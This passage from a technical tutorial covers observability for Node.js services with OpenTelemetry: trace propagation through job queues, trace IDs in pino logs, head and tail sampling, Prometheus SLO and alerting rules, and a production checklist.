export async function handleOrderNotification(job: Job) {
  const parentContext = propagation.extract(
    context.active(),
    job.data._otelContext ?? {}
  )

  // Run within the restored context — spans created here are children
  // of the original POST /orders trace
  await context.with(parentContext, async () => {
    const tracer = getTracer()
    return tracer.startActiveSpan('notifications.send', async (span) => {
      try {
        await sendNotification(job.data.orderId)
        span.setStatus({ code: SpanStatusCode.OK })
      } finally {
        span.end()
      }
    })
  })
}
Without context propagation in queues and workers, every background job appears as an isolated trace with no connection to the request that triggered it. With it, you see the full picture: request → queue publish → worker execution → DB write, all in one trace.

Why histograms matter more than averages

An average latency of 100ms can hide the fact that 1% of requests take 10 seconds. Histograms let you query percentiles — p50, p95, p99. The difference between p50 and p99 latency tells you whether you have a consistent problem or a tail latency problem, which leads to completely different fixes.

Attribute cardinality is critical. A unique attribute value per user ID would create millions of metric series and crash your Prometheus. Attributes should have low cardinality — status codes, regions, plan types, boolean flags. Never use user IDs, order IDs, or request IDs as metric attributes.

Structured logging

We covered pino setup in the Logging section — this tab covers how logging integrates with the OTel observability stack specifically. The critical addition is injecting trace context into every log line.

Why trace context in logs matters

When an error occurs, you'll find it in your log aggregator. Without trace context you're stuck filtering by time and endpoint hoping to find related entries. With a traceId on every log line, you click the trace ID and jump directly to the full distributed trace in Jaeger, seeing exactly what the code was doing across every service at the moment the error was logged.

Injecting trace context into pino logs

// middleware/requestLogger.ts
import { trace, context } from '@opentelemetry/api'

export function requestLogger(req, res, next) {
  const span     = trace.getActiveSpan()
  const spanCtx  = span?.spanContext()

  // Inject trace context — these fields appear in every log line
  // for this request, enabling jump-to-trace from your log aggregator
  req.log = logger.child({
    traceId: spanCtx?.traceId,
    spanId:  spanCtx?.spanId,
    requestId: req.id,
  })

  const start = Date.now()
  res.on('finish', () => {
    req.log.info({
      method: req.method,
      path:   req.path,
      status: res.statusCode,
      ms:     Date.now() - start,
    })
  })
  next()
}

Sampling strategy

At scale, recording 100% of traces is expensive and usually unnecessary — most requests succeed in normal time and aren't interesting to store. Sampling reduces volume while ensuring you keep the traces that matter.

Head sampling — decide at trace start

// instrumentation.ts — sample 10% of all traces
// Decision made at the first span before any child spans are created
sampler: new ParentBasedSampler({
  root: new TraceIdRatioBasedSampler(0.1)  // 10%
})

// ParentBasedSampler: if an upstream service sampled the trace,
// this service keeps it too — prevents incomplete traces

Head sampling is simple and cheap, but blind — you might drop the 10% that contains your errors. Use it only for very high-volume services where you need cost control above all else.

Tail sampling — decide after the trace is complete

Tail sampling (in the Collector) waits for the full trace to arrive, then applies intelligent rules. This is almost always the right approach in production.

# In the OTel Collector config (see Collector tab):
# Keep 100% of error traces
# Keep 100% of traces over 1000ms
# Keep 10% of everything else
tail_sampling:
  decision_wait: 10s    # wait up to 10s for all spans to arrive
  policies:
    - name: keep-errors
      type: status_code
      status_code: { status_codes: [ERROR] }
    - name: keep-slow
      type: latency
      latency: { threshold_ms: 1000 }
    - name: sample-normal
      type: probabilistic
      probabilistic: { sampling_percentage: 10 }

Always sample certain routes

// In instrumentation.ts — override sampling for specific routes
// Useful for payment flows, auth flows where you always want full traces
import { AlwaysOnSampler } from '@opentelemetry/sdk-trace-base'

const customSampler = {
  shouldSample(ctx, traceId, spanName, kind, attrs) {
    // Always sample payment and auth routes
    const url = attrs?.['http.url'] as string ?? ''
    if (url.includes('/payment') || url.includes('/auth')) {
      return { decision: SamplingDecision.RECORD_AND_SAMPLED }
    }
    // Default ratio sampling for everything else
    return ratioSampler.shouldSample(ctx, traceId, spanName, kind, attrs)
  },
  toString: () => 'CustomSampler'
}

Alerting & SLOs

Alerts should wake someone up only when a user-visible problem exists. Alert on symptoms, not causes — alert on error rate, not CPU usage. CPU spiking might be fine; users getting errors is never fine.

Service Level Objectives (SLOs)

An SLO is a target for how reliable your service should be. Alerting fires when you're at risk of breaching it. This is a more disciplined approach than ad-hoc threshold alerts.

# Example SLOs for an API service:
# - 99.9% of requests succeed (error rate < 0.1%)
# - 95% of requests complete in under 200ms
# - 99% of requests complete in under 1000ms

# Prometheus recording rules (pre-compute for efficiency)
groups:
  - name: slo_rules
    interval: 30s
    rules:
      # Request success rate over 5 minutes
      - record: job:request_success_rate:5m
        expr: |
          1 - (
            rate(http_server_duration_count{http_status_code=~"5.."}[5m])
            /
            rate(http_server_duration_count[5m])
          )

Prometheus alerting rules

groups:
  - name: api_alerts
    rules:
      # Error rate above 1% for 5 minutes — page immediately
      - alert: HighErrorRate
        expr: job:request_success_rate:5m < 0.99
        for: 5m
        labels:   { severity: critical }
        annotations:
          summary: "Error rate {{ $value | humanizePercentage }} on {{ $labels.job }}"

      # p99 latency above 2 seconds for 10 minutes
      - alert: HighLatency
        expr: |
          histogram_quantile(0.99,
            rate(http_server_duration_bucket[5m])
          ) > 2
        for: 10m
        labels:   { severity: warning }
        annotations:
          summary: "p99 latency {{ $value }}s on {{ $labels.http_route }}"

      # No requests for 5 minutes during business hours (possible outage)
      - alert: NoTraffic
        expr: rate(http_server_duration_count[5m]) == 0
        for: 5m
        labels:   { severity: critical }

Observability checklist

Instrumentation

OTel SDK loaded via --import before all other modules

instrumentation.ts loaded first. sdk.start() called synchronously, not inside async.

Service resource attributes set: name, version, environment

All telemetry from this process is identifiable. Essential when running multiple services.

sdk.shutdown() called on SIGTERM and SIGINT

Ensures in-flight telemetry is flushed before process exits. Without this you lose the last batch of spans.

Health check route excluded from trace instrumentation

Eliminates noise — health checks are high-frequency, always successful, and never interesting.

Custom spans on all significant business operations

Auto-instrumentation covers infrastructure. Custom spans cover domain — order creation, payment processing, email dispatch.

span.end() always in a finally block

A span that never ends is silently dropped or leaks memory. No exceptions.

Metrics

RED metrics visible per route: rate, error rate, p99 latency

Minimum viable dashboard for any API service. First stop in every incident.

Metric attributes are low cardinality

No user IDs, order IDs, or UUIDs as attributes. Status codes, regions, plan types only.

DB connection pool depth tracked as ObservableGauge

Pool exhaustion is a common production failure mode — you want to see it coming.

Logs

traceId injected into every log line

Enables log-to-trace correlation. Without this, logs and traces are separate islands.

Security events logged with structured fields

auth.login.failure, auth.token.reuse, authz.forbidden — all with ip, userId, requestId.

No PII or secrets in logs

Passwords, tokens, card numbers, SSNs never appear in log output under any conditions.

Alerting

Alerts fire on symptoms, not causes

Error rate and latency, not CPU or memory. Alert on what users experience.

Every critical alert has a runbook

A link in the alert annotation to a document explaining: what this means, how to investigate, known causes, how to fix.

Tail sampling in production — always keep errors and slow traces

Head sampling at a ratio drops errors randomly. Tail sampling in the Collector ensures you always keep the interesting traces.
